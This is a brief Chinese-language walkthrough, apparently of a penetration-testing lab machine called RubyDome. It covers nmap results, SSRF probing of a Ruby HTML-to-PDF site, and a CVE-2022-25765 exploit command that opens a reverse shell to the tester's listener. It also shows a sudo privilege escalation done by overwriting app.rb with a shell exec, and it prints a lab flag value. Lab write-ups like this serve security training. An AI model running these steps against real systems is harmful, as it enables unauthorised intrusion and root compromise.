nmap 結果
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
| _http-title: RubyDome HTML to PDF_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07) |
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

連上去是一個 http 轉 pdf 的網站 嘗試看看 SSRF `http://127.0.0.1`
![image](https://hackmd.io/_uploads/ryJKarKB1g.png)

成功讓他報錯 並知道使用什麼套件 上網找有沒有相關 exploit 找到一個可以 RCE 的 [這個](https://github.com/UNICORDev/exploit-CVE-2022-25765?tab=readme-ov-file)

成功拿到 reverse shell 
```python
python3 exploit-CVE-2022-25765.py -s 192.168.45.187 8888 -w http://192.168.179.22:3000/pdf -p url
```

拿到 local.txt `2927259b804f3ad39caff2f5bcece6e6`
![image](https://hackmd.io/_uploads/BJm1BNqB1g.png)

他可以 sudo -l 發現 `/home/andrew/app/app.rb` 可以在沒密碼的情況下執行
![image](https://hackmd.io/_uploads/HJnrRVqr1e.png)

`.rb` 是 ruby 的檔案 `ls -al` 發現我們也有修改檔案權限 去 GTOFBiN 看 ruby 有沒有提權方法
![image](https://hackmd.io/_uploads/SkWcA4crJg.png)

把原本的 app.rb 用 `exec "/bin/sh"` 蓋掉 並執行他 成功提權拿 flag
```
sudo /usr/bin/ruby /home/andrew/app/app.rb
```
![image](https://hackmd.io/_uploads/HypaCVcBke.png)
